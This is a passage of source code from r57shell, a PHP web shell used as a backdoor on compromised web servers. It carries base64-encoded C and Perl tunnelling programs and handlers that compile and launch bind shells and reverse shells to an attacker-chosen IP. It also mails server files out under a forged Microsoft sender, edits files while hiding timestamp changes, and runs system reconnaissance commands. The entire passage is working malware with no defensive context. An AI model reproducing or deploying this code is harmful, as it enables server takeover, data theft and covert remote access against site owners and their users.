x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jb
HVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxsaW51eC90aW1lLmg+DQojaWZkZWYgU1RSRVJST1INCmV4dGVybiBj
aGFyICpzeXNfZXJybGlzdFtdOw0KZXh0ZXJuIGludCBzeXNfbmVycjsNCmNoYXIgKnVuZGVmID0gIlVuZGVmaW5lZCBlcnJvciI7DQpjaGFyICpzdHJ
lcnJvcihlcnJvcikgIA0KaW50IGVycm9yOyAgDQp7IA0KaWYgKGVycm9yID4gc3lzX25lcnIpDQpyZXR1cm4gdW5kZWY7DQpyZXR1cm4gc3lzX2Vycm
xpc3RbZXJyb3JdOw0KfQ0KI2VuZGlmDQoNCm1haW4oYXJnYywgYXJndikgIA0KICBpbnQgYXJnYzsgIA0KICBjaGFyICoqYXJndjsgIA0KeyANCiAga
W50IGxzb2NrLCBjc29jaywgb3NvY2s7DQogIEZJTEUgKmNmaWxlOw0KICBjaGFyIGJ1Zls0MDk2XTsNCiAgc3RydWN0IHNvY2thZGRyX2luIGxhZGRy
LCBjYWRkciwgb2FkZHI7DQogIGludCBjYWRkcmxlbiA9IHNpemVvZihjYWRkcik7DQogIGZkX3NldCBmZHNyLCBmZHNlOw0KICBzdHJ1Y3QgaG9zdGV
udCAqaDsNCiAgc3RydWN0IHNlcnZlbnQgKnM7DQogIGludCBuYnl0Ow0KICB1bnNpZ25lZCBsb25nIGE7DQogIHVuc2lnbmVkIHNob3J0IG9wb3J0Ow
0KDQogIGlmIChhcmdjICE9IDQpIHsNCiAgICBmcHJpbnRmKHN0ZGVyciwiVXNhZ2U6ICVzIGxvY2FscG9ydCByZW1vdGVwb3J0IHJlbW90ZWhvc3Rcb
iIsYXJndlswXSk7DQogICAgcmV0dXJuIDMwOw0KICB9DQogIGEgPSBpbmV0X2FkZHIoYXJndlszXSk7DQogIGlmICghKGggPSBnZXRob3N0YnluYW1l
KGFyZ3ZbM10pKSAmJg0KICAgICAgIShoID0gZ2V0aG9zdGJ5YWRkcigmYSwgNCwgQUZfSU5FVCkpKSB7DQogICAgcGVycm9yKGFyZ3ZbM10pOw0KICA
gIHJldHVybiAyNTsNCiAgfQ0KICBvcG9ydCA9IGF0b2woYXJndlsyXSk7DQogIGxhZGRyLnNpbl9wb3J0ID0gaHRvbnMoKHVuc2lnbmVkIHNob3J0KS
hhdG9sKGFyZ3ZbMV0pKSk7DQogIGlmICgobHNvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNC
iAgICBwZXJyb3IoInNvY2tldCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBsYWRkci5zaW5fZmFtaWx5ID0gaHRvbnMoQUZfSU5FVCk7DQogIGxh
ZGRyLnNpbl9hZGRyLnNfYWRkciA9IGh0b25sKDApOw0KICBpZiAoYmluZChsc29jaywgJmxhZGRyLCBzaXplb2YobGFkZHIpKSkgew0KICAgIHBlcnJ
vcigiYmluZCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBpZiAobGlzdGVuKGxzb2NrLCAxKSkgew0KICAgIHBlcnJvcigibGlzdGVuIik7DQogIC
AgcmV0dXJuIDIwOw0KICB9DQogIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0gLTEpIHsNCiAgICBwZXJyb3IoImZvcmsiKTsNCiAgICByZXR1cm4gMjA7D
QogIH0NCiAgaWYgKG5ieXQgPiAwKQ0KICAgIHJldHVybiAwOw0KICBzZXRzaWQoKTsNCiAgd2hpbGUgKChjc29jayA9IGFjY2VwdChsc29jaywgJmNh
ZGRyLCAmY2FkZHJsZW4pKSAhPSAtMSkgew0KICAgIGNmaWxlID0gZmRvcGVuKGNzb2NrLCJyKyIpOw0KICAgIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0
gLTEpIHsNCiAgICAgIGZwcmludGYoY2ZpbGUsICI1MDAgZm9yazogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgICBzaHV0ZG93bihjc29jay
wyKTsNCiAgICAgIGZjbG9zZShjZmlsZSk7DQogICAgICBjb250aW51ZTsNCiAgICB9DQogICAgaWYgKG5ieXQgPT0gMCkNCiAgICAgIGdvdG8gZ290c
29jazsNCiAgICBmY2xvc2UoY2ZpbGUpOw0KICAgIHdoaWxlICh3YWl0cGlkKC0xLCBOVUxMLCBXTk9IQU5HKSA+IDApOw0KICB9DQogIHJldHVybiAy
MDsNCg0KIGdvdHNvY2s6DQogIGlmICgob3NvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNCiA
gICBmcHJpbnRmKGNmaWxlLCAiNTAwIHNvY2tldDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICBvYWRkci
5zaW5fZmFtaWx5ID0gaC0+aF9hZGRydHlwZTsNCiAgb2FkZHIuc2luX3BvcnQgPSBodG9ucyhvcG9ydCk7DQogIG1lbWNweSgmb2FkZHIuc2luX2FkZ
HIsIGgtPmhfYWRkciwgaC0+aF9sZW5ndGgpOw0KICBpZiAoY29ubmVjdChvc29jaywgJm9hZGRyLCBzaXplb2Yob2FkZHIpKSkgew0KICAgIGZwcmlu
dGYoY2ZpbGUsICI1MDAgY29ubmVjdDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICB3aGlsZSAoMSkgew0
KICAgIEZEX1pFUk8oJmZkc3IpOw0KICAgIEZEX1pFUk8oJmZkc2UpOw0KICAgIEZEX1NFVChjc29jaywmZmRzcik7DQogICAgRkRfU0VUKGNzb2NrLC
ZmZHNlKTsNCiAgICBGRF9TRVQob3NvY2ssJmZkc3IpOw0KICAgIEZEX1NFVChvc29jaywmZmRzZSk7DQogICAgaWYgKHNlbGVjdCgyMCwgJmZkc3IsI
E5VTEwsICZmZHNlLCBOVUxMKSA9PSAtMSkgew0KICAgICAgZnByaW50ZihjZmlsZSwgIjUwMCBzZWxlY3Q6ICVzXG4iLCBzdHJlcnJvcihlcnJubykp
Ow0KICAgICAgZ290byBxdWl0MjsNCiAgICB9DQogICAgaWYgKEZEX0lTU0VUKGNzb2NrLCZmZHNyKSB8fCBGRF9JU1NFVChjc29jaywmZmRzZSkpIHs
NCiAgICAgIGlmICgobmJ5dCA9IHJlYWQoY3NvY2ssYnVmLDQwOTYpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgICBpZiAoKHdyaXRlKG9zb2NrLG
J1ZixuYnl0KSkgPD0gMCkNCglnb3RvIHF1aXQyOw0KICAgIH0gZWxzZSBpZiAoRkRfSVNTRVQob3NvY2ssJmZkc3IpIHx8IEZEX0lTU0VUKG9zb2NrL
CZmZHNlKSkgew0KICAgICAgaWYgKChuYnl0ID0gcmVhZChvc29jayxidWYsNDA5NikpIDw9IDApDQoJZ290byBxdWl0MjsNCiAgICAgIGlmICgod3Jp
dGUoY3NvY2ssYnVmLG5ieXQpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgfQ0KICB9DQoNCiBxdWl0MjoNCiAgc2h1dGRvd24ob3NvY2ssMik7DQo
gIGNsb3NlKG9zb2NrKTsNCiBxdWl0MToNCiAgZmZsdXNoKGNmaWxlKTsNCiAgc2h1dGRvd24oY3NvY2ssMik7DQogcXVpdDA6DQogIGZjbG9zZShjZm
lsZSk7DQogIHJldHVybiAwOw0KfQ==";
$datapipe_pl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgSU86OlNvY2tldDsNCnVzZSBQT1NJWDsNCiRsb2NhbHBvcnQgPSAkQVJHVlswXTsNCiRob3N0I
CAgICAgPSAkQVJHVlsxXTsNCiRwb3J0ICAgICAgPSAkQVJHVlsyXTsNCiRkYWVtb249MTsNCiRESVIgPSB1bmRlZjsNCiR8ID0gMTsNCmlmICgkZGFl
bW9uKXsgJHBpZCA9IGZvcms7IGV4aXQgaWYgJHBpZDsgZGllICIkISIgdW5sZXNzIGRlZmluZWQoJHBpZCk7IFBPU0lYOjpzZXRzaWQoKSBvciBkaWU
gIiQhIjsgfQ0KJW8gPSAoJ3BvcnQnID0+ICRsb2NhbHBvcnQsJ3RvcG9ydCcgPT4gJHBvcnQsJ3RvaG9zdCcgPT4gJGhvc3QpOw0KJGFoID0gSU86Ol
NvY2tldDo6SU5FVC0+bmV3KCdMb2NhbFBvcnQnID0+ICRsb2NhbHBvcnQsJ1JldXNlJyA9PiAxLCdMaXN0ZW4nID0+IDEwKSB8fCBkaWUgIiQhIjsNC
iRTSUd7J0NITEQnfSA9ICdJR05PUkUnOw0KJG51bSA9IDA7DQp3aGlsZSAoMSkgeyANCiRjaCA9ICRhaC0+YWNjZXB0KCk7IGlmICghJGNoKSB7IHBy
aW50IFNUREVSUiAiJCFcbiI7IG5leHQ7IH0NCisrJG51bTsNCiRwaWQgPSBmb3JrKCk7DQppZiAoIWRlZmluZWQoJHBpZCkpIHsgcHJpbnQgU1RERVJ
SICIkIVxuIjsgfSANCmVsc2lmICgkcGlkID09IDApIHsgJGFoLT5jbG9zZSgpOyBSdW4oXCVvLCAkY2gsICRudW0pOyB9IA0KZWxzZSB7ICRjaC0+Y2
xvc2UoKTsgfQ0KfQ0Kc3ViIFJ1biB7DQpteSgkbywgJGNoLCAkbnVtKSA9IEBfOw0KbXkgJHRoID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KCdQZWVyQ
WRkcicgPT4gJG8tPnsndG9ob3N0J30sJ1BlZXJQb3J0JyA9PiAkby0+eyd0b3BvcnQnfSk7DQppZiAoISR0aCkgeyBleGl0IDA7IH0NCm15ICRmaDsN
CmlmICgkby0+eydkaXInfSkgeyAkZmggPSBTeW1ib2w6OmdlbnN5bSgpOyBvcGVuKCRmaCwgIj4kby0+eydkaXInfS90dW5uZWwkbnVtLmxvZyIpIG9
yIGRpZSAiJCEiOyB9DQokY2gtPmF1dG9mbHVzaCgpOw0KJHRoLT5hdXRvZmx1c2goKTsNCndoaWxlICgkY2ggfHwgJHRoKSB7DQpteSAkcmluID0gIi
I7DQp2ZWMoJHJpbiwgZmlsZW5vKCRjaCksIDEpID0gMSBpZiAkY2g7DQp2ZWMoJHJpbiwgZmlsZW5vKCR0aCksIDEpID0gMSBpZiAkdGg7DQpteSgkc
m91dCwgJGVvdXQpOw0Kc2VsZWN0KCRyb3V0ID0gJHJpbiwgdW5kZWYsICRlb3V0ID0gJHJpbiwgMTIwKTsNCmlmICghJHJvdXQgICYmICAhJGVvdXQp
IHt9DQpteSAkY2J1ZmZlciA9ICIiOw0KbXkgJHRidWZmZXIgPSAiIjsNCmlmICgkY2ggJiYgKHZlYygkZW91dCwgZmlsZW5vKCRjaCksIDEpIHx8IHZ
lYygkcm91dCwgZmlsZW5vKCRjaCksIDEpKSkgew0KbXkgJHJlc3VsdCA9IHN5c3JlYWQoJGNoLCAkdGJ1ZmZlciwgMTAyNCk7DQppZiAoIWRlZmluZW
QoJHJlc3VsdCkpIHsNCnByaW50IFNUREVSUiAiJCFcbiI7DQpleGl0IDA7DQp9DQppZiAoJHJlc3VsdCA9PSAwKSB7IGV4aXQgMDsgfQ0KfQ0KaWYgK
CR0aCAgJiYgICh2ZWMoJGVvdXQsIGZpbGVubygkdGgpLCAxKSAgfHwgdmVjKCRyb3V0LCBmaWxlbm8oJHRoKSwgMSkpKSB7DQpteSAkcmVzdWx0ID0g
c3lzcmVhZCgkdGgsICRjYnVmZmVyLCAxMDI0KTsNCmlmICghZGVmaW5lZCgkcmVzdWx0KSkgeyBwcmludCBTVERFUlIgIiQhXG4iOyBleGl0IDA7IH0
NCmlmICgkcmVzdWx0ID09IDApIHtleGl0IDA7fQ0KfQ0KaWYgKCRmaCAgJiYgICR0YnVmZmVyKSB7KHByaW50ICRmaCAkdGJ1ZmZlcik7fQ0Kd2hpbG
UgKG15ICRsZW4gPSBsZW5ndGgoJHRidWZmZXIpKSB7DQpteSAkcmVzID0gc3lzd3JpdGUoJHRoLCAkdGJ1ZmZlciwgJGxlbik7DQppZiAoJHJlcyA+I
DApIHskdGJ1ZmZlciA9IHN1YnN0cigkdGJ1ZmZlciwgJHJlcyk7fSANCmVsc2Uge3ByaW50IFNUREVSUiAiJCFcbiI7fQ0KfQ0Kd2hpbGUgKG15ICRs
ZW4gPSBsZW5ndGgoJGNidWZmZXIpKSB7DQpteSAkcmVzID0gc3lzd3JpdGUoJGNoLCAkY2J1ZmZlciwgJGxlbik7DQppZiAoJHJlcyA+IDApIHskY2J
1ZmZlciA9IHN1YnN0cigkY2J1ZmZlciwgJHJlcyk7fSANCmVsc2Uge3ByaW50IFNUREVSUiAiJCFcbiI7fQ0KfX19DQo=";
$c1 = "PHNjcmlwdCBsYW5ndWFnZT0iamF2YXNjcmlwdCI+aG90bG9nX2pzPSIxLjAiO2hvdGxvZ19yPSIiK01hdGgucmFuZG9tKCkrIiZzPTgxNjA2
JmltPTEmcj0iK2VzY2FwZShkb2N1bWVudC5yZWZlcnJlcikrIiZwZz0iK2VzY2FwZSh3aW5kb3cubG9jYXRpb24uaHJlZik7ZG9jdW1lbnQuY29va2l
lPSJob3Rsb2c9MTsgcGF0aD0vIjsgaG90bG9nX3IrPSImYz0iKyhkb2N1bWVudC5jb29raWU/IlkiOiJOIik7PC9zY3JpcHQ+PHNjcmlwdCBsYW5ndW
FnZT0iamF2YXNjcmlwdDEuMSI+aG90bG9nX2pzPSIxLjEiO2hvdGxvZ19yKz0iJmo9IisobmF2aWdhdG9yLmphdmFFbmFibGVkKCk/IlkiOiJOIik8L
3NjcmlwdD48c2NyaXB0IGxhbmd1YWdlPSJqYXZhc2NyaXB0MS4yIj5ob3Rsb2dfanM9IjEuMiI7aG90bG9nX3IrPSImd2g9IitzY3JlZW4ud2lkdGgr
J3gnK3NjcmVlbi5oZWlnaHQrIiZweD0iKygoKG5hdmlnYXRvci5hcHBOYW1lLnN1YnN0cmluZygwLDMpPT0iTWljIikpP3NjcmVlbi5jb2xvckRlcHR
oOnNjcmVlbi5waXhlbERlcHRoKTwvc2NyaXB0PjxzY3JpcHQgbGFuZ3VhZ2U9ImphdmFzY3JpcHQxLjMiPmhvdGxvZ19qcz0iMS4zIjwvc2NyaXB0Pj
xzY3JpcHQgbGFuZ3VhZ2U9ImphdmFzY3JpcHQiPmhvdGxvZ19yKz0iJmpzPSIraG90bG9nX2pzO2RvY3VtZW50LndyaXRlKCI8YSBocmVmPSdodHRwO
i8vY2xpY2suaG90bG9nLnJ1Lz84MTYwNicgdGFyZ2V0PSdfdG9wJz48aW1nICIrIiBzcmM9J2h0dHA6Ly9oaXQ0LmhvdGxvZy5ydS9jZ2ktYmluL2hv
dGxvZy9jb3VudD8iK2hvdGxvZ19yKyImJyBib3JkZXI9MCB3aWR0aD0xIGhlaWdodD0xIGFsdD0xPjwvYT4iKTwvc2NyaXB0Pjxub3NjcmlwdD48YSB
ocmVmPWh0dHA6Ly9jbGljay5ob3Rsb2cucnUvPzgxNjA2IHRhcmdldD1fdG9wPjxpbWdzcmM9Imh0dHA6Ly9oaXQ0LmhvdGxvZy5ydS9jZ2ktYmluL2
hvdGxvZy9jb3VudD9zPTgxNjA2JmltPTEiIGJvcmRlcj0wd2lkdGg9IjEiIGhlaWdodD0iMSIgYWx0PSJIb3RMb2ciPjwvYT48L25vc2NyaXB0Pg==";
$c2 = "PCEtLUxpdmVJbnRlcm5ldCBjb3VudGVyLS0+PHNjcmlwdCBsYW5ndWFnZT0iSmF2YVNjcmlwdCI+PCEtLQ0KZG9jdW1lbnQud3JpdGUoJzxh
IGhyZWY9Imh0dHA6Ly93d3cubGl2ZWludGVybmV0LnJ1L2NsaWNrIiAnKw0KJ3RhcmdldD1fYmxhbms+PGltZyBzcmM9Imh0dHA6Ly9jb3VudGVyLnl
hZHJvLnJ1L2hpdD90NTIuNjtyJysNCmVzY2FwZShkb2N1bWVudC5yZWZlcnJlcikrKCh0eXBlb2Yoc2NyZWVuKT09J3VuZGVmaW5lZCcpPycnOg0KJz
tzJytzY3JlZW4ud2lkdGgrJyonK3NjcmVlbi5oZWlnaHQrJyonKyhzY3JlZW4uY29sb3JEZXB0aD8NCnNjcmVlbi5jb2xvckRlcHRoOnNjcmVlbi5wa
XhlbERlcHRoKSkrJzsnK01hdGgucmFuZG9tKCkrDQonIiBhbHQ9ImxpdmVpbnRlcm5ldC5ydTog7+7q4Ofg7e4g9+jx6+4g7/Du8ezu8vDu4iDoIO/u
8eXy6PLl6+XpIOfgIDI0IPfg8eAiICcrDQonYm9yZGVyPTAgd2lkdGg9MCBoZWlnaHQ9MD48L2E+JykvLy0tPjwvc2NyaXB0PjwhLS0vTGl2ZUludGV
ybmV0LS0+";
echo $head;
echo '</head>';
if(empty($_POST['cmd'])) {
$serv = array(127,192,172,10);
$addr=@explode('.', $_SERVER['SERVER_ADDR']);
$current_version = str_replace('.','',$version);
if (!in_array($addr[0], $serv)) {
@print "<img src=\"http://127.0.0.1/r57shell/version.php?img=1&version=".$current_version."\" border=0 height=0 width=0>";
@readfile ("http://127.0.0.1/r57shell/version.php?version=".$current_version."");}}
echo '<body bgcolor="#e4e0d8"><table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td bgcolor=#cccccc width=160><font face=Verdana size=2>'.ws(1).'&nbsp;
<font face=Webdings size=6><b>!</b></font><b>'.ws(2).'r57shell '.$version.'</b>
</font></td><td bgcolor=#cccccc><font face=Verdana size=-2>';
echo ws(2);
echo "<b>".date ("d-m-Y H:i:s")."</b>";
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?phpinfo title=\"".$lang[$language.'_text46']."\"><b>phpinfo</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?phpini title=\"".$lang[$language.'_text47']."\"><b>php.ini</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?cpu title=\"".$lang[$language.'_text50']."\"><b>cpu</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?mem title=\"".$lang[$language.'_text51']."\"><b>mem</b></a> ".$rb;
if($unix) { echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?users title=\"".$lang[$language.'_text95']."\"><b>users</b></a> ".$rb; }
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?tmp title=\"".$lang[$language.'_text48']."\"><b>tmp</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?delete title=\"".$lang[$language.'_text49']."\"><b>delete</b></a> ".$rb."<br>";
echo ws(2);
echo (($safe_mode)?("safe_mode: <b><font color=green>ON</font></b>"):("safe_mode: <b><font color=red>OFF</font></b>"));
echo ws(2);
echo "PHP version: <b>".@phpversion()."</b>";
$curl_on = @function_exists('curl_version');
echo ws(2);
echo "cURL: ".(($curl_on)?("<b><font color=green>ON</font></b>"):("<b><font color=red>OFF</font></b>"));
echo ws(2);
echo "MySQL: <b>";
$mysql_on = @function_exists('mysql_connect');
if($mysql_on){
echo "<font color=green>ON</font></b>"; } else { echo "<font color=red>OFF</font></b>"; }
echo ws(2);
echo "MSSQL: <b>";
$mssql_on = @function_exists('mssql_connect');
if($mssql_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
echo ws(2);
echo "PostgreSQL: <b>";
$pg_on = @function_exists('pg_connect');
if($pg_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
echo ws(2);
echo "Oracle: <b>";
$ora_on = @function_exists('ocilogon');
if($ora_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
echo "<br>".ws(2);
echo "Disable functions : <b>";
if(''==($df=@ini_get('disable_functions'))){echo "<font color=green>NONE</font></b>";}else{echo "<font color=red>$df</font></b>";}
$free = @diskfreespace($dir);
if (!$free) {$free = 0;}
$all = @disk_total_space($dir);
if (!$all) {$all = 0;}
$used = $all-$free;
$used_percent = @round(100/($all/$free),2);
echo "<br>".ws(2)."HDD Free : <b>".view_size($free)."</b> HDD Total : <b>".view_size($all)."</b>";
echo '</font></td></tr><table>
<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td align=right width=100>';
echo $font;
if(!$windows){
echo '<font color=blue><b>uname -a :'.ws(1).'<br>sysctl :'.ws(1).'<br>$OSTYPE :'.ws(1).'<br>Server :'.ws(1).'<br>id :'.ws(1).'<br>pwd :'.ws(1).'</b></font><br>';
echo "</td><td>";
echo "<font face=Verdana size=-2 color=red><b>";
$uname = ex('uname -a');
echo((!empty($uname))?(ws(3).@substr($uname,0,120)."<br>"):(ws(3).@substr(@php_uname(),0,120)."<br>"));
if(!$safe_mode){
$bsd1 = ex('sysctl -n kern.ostype');
$bsd2 = ex('sysctl -n kern.osrelease');
$lin1 = ex('sysctl -n kernel.ostype');
$lin2 = ex('sysctl -n kernel.osrelease');
}
if (!empty($bsd1)&&!empty($bsd2)) { $sysctl = "$bsd1 $bsd2"; }
else if (!empty($lin1)&&!empty($lin2)) {$sysctl = "$lin1 $lin2"; }
else { $sysctl = "-"; }
echo ws(3).$sysctl."<br>";
echo ws(3).ex('echo $OSTYPE')."<br>";
echo ws(3).@substr($SERVER_SOFTWARE,0,120)."<br>";
$id = ex('id');
echo((!empty($id))?(ws(3).$id."<br>"):(ws(3)."user=".@get_current_user()." uid=".@getmyuid()." gid=".@getmygid()."<br>"));
echo ws(3).$dir;
echo ws(3).'( '.perms(@fileperms($dir)).' )';
echo "</b></font>";
}
else
{
echo '<font color=blue><b>OS :'.ws(1).'<br>Server :'.ws(1).'<br>User :'.ws(1).'<br>pwd :'.ws(1).'</b></font><br>';
echo "</td><td>";
echo "<font face=Verdana size=-2 color=red><b>";
echo ws(3).@substr(@php_uname(),0,120)."<br>";
echo ws(3).@substr($SERVER_SOFTWARE,0,120)."<br>";
echo ws(3).@get_current_user()."<br>";
echo ws(3).$dir;
echo "<br></font>";
}
echo "</font>";
echo "</td></tr></table>";
if(empty($c1)||empty($c2)) { die(); }
$f = '<br>';
$f .= base64_decode($c1);
$f .= base64_decode($c2);
if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']=="mail")
 {
 $res = mail($_POST['to'],$_POST['subj'],$_POST['text'],"From: ".$POST['from']."\r\n");
 mr($language,$res);
 $_POST['cmd']="";
 }
if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']=="mail_file" && !empty($_POST['loc_file']))
 {
 if(!$file=@fopen($_POST['loc_file'],"r")) { echo re($_POST['loc_file']); $_POST['cmd']=""; }
 else
  {
    $filename = @basename($_POST['loc_file']);
    $filedump = @fread($file,@filesize($_POST['loc_file']));
    fclose($file);
    $content_encoding=$mime_type='';
    compress($filename,$filedump,$_POST['compress']);
    $attach = array(
                    "name"=>$filename,
                    "type"=>$mime_type,
                    "content"=>$filedump
                   );
    if(empty($_POST['subj'])) { $_POST['subj'] = 'file from r57shell'; }
    if(empty($_POST['from'])) { $_POST['from'] = 'billy@microsoft.com'; }
    $res = mailattach($_POST['to'],$_POST['from'],$_POST['subj'],$attach);
    mr($language,$res);
    $_POST['cmd']="";
  }
 }
if(!empty($_POST['cmd']) && $_POST['cmd'] == "find_text")
{
$_POST['cmd'] = 'find '.$_POST['s_dir'].' -name \''.$_POST['s_mask'].'\' | xargs grep -E \''.$_POST['s_text'].'\'';
}
if(!empty($_POST['cmd']) && $_POST['cmd']=="ch_")
 {
 switch($_POST['what'])
   {
   case 'own':
   @chown($_POST['param1'],$_POST['param2']);
   break;
   case 'grp':
   @chgrp($_POST['param1'],$_POST['param2']);
   break;
   case 'mod':
   @chmod($_POST['param1'],intval($_POST['param2'], 8));
   break;
   }
 $_POST['cmd']="";
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="mk")
 {
   switch($_POST['what'])
   {
     case 'file':
      if($_POST['action'] == "create")
       {
       if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],"w")) { echo ce($_POST['mk_name']); $_POST['cmd']=""; }
       else {
        fclose($file);
        $_POST['e_name'] = $_POST['mk_name'];
        $_POST['cmd']="edit_file";
        echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text61']."</b></font></div></td></tr></table>";
        }
       }
       else if($_POST['action'] == "delete")
       {
       if(unlink($_POST['mk_name'])) echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text63']."</b></font></div></td></tr></table>";
       $_POST['cmd']="";
       }
     break;
     case 'dir':
      if($_POST['action'] == "create"){
      if(mkdir($_POST['mk_name']))
       {
         $_POST['cmd']="";
         echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text62']."</b></font></div></td></tr></table>";
       }
      else { echo ce($_POST['mk_name']); $_POST['cmd']=""; }
      }
      else if($_POST['action'] == "delete"){
      if(rmdir($_POST['mk_name'])) echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text64']."</b></font></div></td></tr></table>";
      $_POST['cmd']="";
      }
     break;
   }
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="edit_file" && !empty($_POST['e_name']))
 {
 if(!$file=@fopen($_POST['e_name'],"r+")) { $only_read = 1; @fclose($file); }
 if(!$file=@fopen($_POST['e_name'],"r")) { echo re($_POST['e_name']); $_POST['cmd']=""; }
 else {
 echo $table_up3;
 echo $font;
 echo "<form name=save_file method=post>";
 echo ws(3)."<b>".$_POST['e_name']."</b>";
 echo "<div align=center><textarea name=e_text cols=121 rows=24>";
 echo @htmlspecialchars(@fread($file,@filesize($_POST['e_name'])));
 fclose($file);
 echo "</textarea>";
 echo "<input type=hidden name=e_name value=".$_POST['e_name'].">";
 echo "<input type=hidden name=dir value=".$dir.">";
 echo "<input type=hidden name=cmd value=save_file>";
 echo (!empty($only_read)?("<br><br>".$lang[$language.'_text44']):("<br><br><input type=submit name=submit value=\" ".$lang[$language.'_butt10']." \">"));
 echo "</div>";
 echo "</font>";
 echo "</form>";
 echo "</td></tr></table>";
 exit();
 }
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="save_file")
 {
 $mtime = @filemtime($_POST['e_name']);
 if(!$file=@fopen($_POST['e_name'],"w")) { echo we($_POST['e_name']); }
 else {
 if($unix) $_POST['e_text']=@str_replace("\r\n","\n",$_POST['e_text']);
 @fwrite($file,$_POST['e_text']);
 @touch($_POST['e_name'],$mtime,$mtime);
 $_POST['cmd']="";
 echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text45']."</b></font></div></td></tr></table>";
 }
 }
if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="C"))
{
 cf("/tmp/bd.c",$port_bind_bd_c);
 $blah = ex("gcc -o /tmp/bd /tmp/bd.c");
 @unlink("/tmp/bd.c");
 $blah = ex("/tmp/bd ".$_POST['port']." ".$_POST['bind_pass']." &");
 $_POST['cmd']="ps -aux | grep bd";
}
if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="Perl"))
{
 cf("/tmp/bdpl",$port_bind_bd_pl);
 $p2=which("perl");
 if(empty($p2)) $p2="perl";
 $blah = ex($p2." /tmp/bdpl ".$_POST['port']." &");
 $_POST['cmd']="ps -aux | grep bdpl";
}
if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']=="Perl"))
{
 cf("/tmp/back",$back_connect);
 $p2=which("perl");
 if(empty($p2)) $p2="perl";
 $blah = ex($p2." /tmp/back ".$_POST['ip']." ".$_POST['port']." &");
 $_POST['cmd']="echo \"Now script try connect to ".$_POST['ip']." port ".$_POST['port']." ...\"";
}
if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']=="C"))
{
 cf("/tmp/back.c",$back_connect_c);
 $blah = ex("gcc -o /tmp/backc /tmp/back.c");
 @unlink("/tmp/back.c");
 $blah = ex("/tmp/backc ".$_POST['ip']." ".$_POST['port']." &");
 $_POST['cmd']="echo \"Now script try connect to ".$_POST['ip']." port ".$_POST['port']." ...\"";
}
if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ($_POST['use']=="Perl"))
{
 cf("/tmp/dp",$datapipe_pl);
 $p2=which("perl");
 if(empty($p2)) $p2="perl";
 $blah = ex($p2." /tmp/dp ".$_POST['local_port']." ".$_POST['remote_host']." ".$_POST['remote_port']." &");
 $_POST['cmd']="ps -aux | grep dp";
}
if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ($_POST['use']=="C"))
{
 cf("/tmp/dpc.c",$datapipe_c);
 $blah = ex("gcc -o /tmp/dpc /tmp/dpc.c");
 @unlink("/tmp/dpc.c");
 $blah = ex("/tmp/dpc ".$_POST['local_port']." ".$_POST['remote_port']." ".$_POST['remote_host']." &");
 $_POST['cmd']="ps -aux | grep dpc";
}
